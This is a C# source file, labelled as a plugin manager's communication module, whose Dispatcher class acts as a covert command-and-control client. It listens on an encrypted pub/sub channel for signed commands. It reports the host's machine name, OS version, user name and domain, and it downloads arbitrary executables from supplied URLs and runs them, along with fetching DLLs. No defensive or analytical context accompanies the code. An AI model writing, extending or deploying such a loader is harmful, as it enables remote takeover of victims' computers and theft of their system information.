using System;
using System.Diagnostics;
using System.Security.Cryptography;
using System.Text;

namespace pluginmanager.Communication
{
    public class Dispatcher
    {
        RSACryptoServiceProvider rsa = Verify.importkey(config.Pubkey);
        PubSub pubSub = new PubSub(config.PubSubPassPhrase);

        public Dispatcher()
        {
            pubSub.Subscribe(config.Channel, (obj) => OnMessage(obj));
            Logger.Log(this.ToString(), "Dispatcher Loaded");

        }
        public async void send(string message)
        {
            await pubSub.Publish(config.Channel, AESEncryption.Encrypt(message, config.CommunicationPassPhrase));
        }
        public void OnMessage(byte[] obj)
        {
            string[] protocolArgs = AESEncryption.Decrypt(Encoding.UTF8.GetString(obj, 0, obj.Length), config.CommunicationPassPhrase).Split('|');
            if (!Verify.VerifyData(protocolArgs[0], protocolArgs[1], rsa.ExportParameters(false)))
                return;
            string[] arguments = protocolArgs[0].Split(',');
            if (arguments[0].Equals("info"))
                send($"{System.Environment.MachineName} {System.Environment.OSVersion} {System.Environment.UserName} {System.Environment.UserDomainName}");
            else if (arguments.Length > 1 && arguments[0].Equals("execute"))
            {
                Download.URLDownloadToFile(0, arguments[1], "tmp.exe", 0, 0);
                Process.Start("tmp.exe");
            }
            else if (arguments.Length > 1 && arguments[0].Equals("download"))
            {
                Random random = new Random();
                Download.URLDownloadToFile(0, arguments[1], $"{random.Next(1000)}.dll", 0, 0);
            }
        }
    }
}
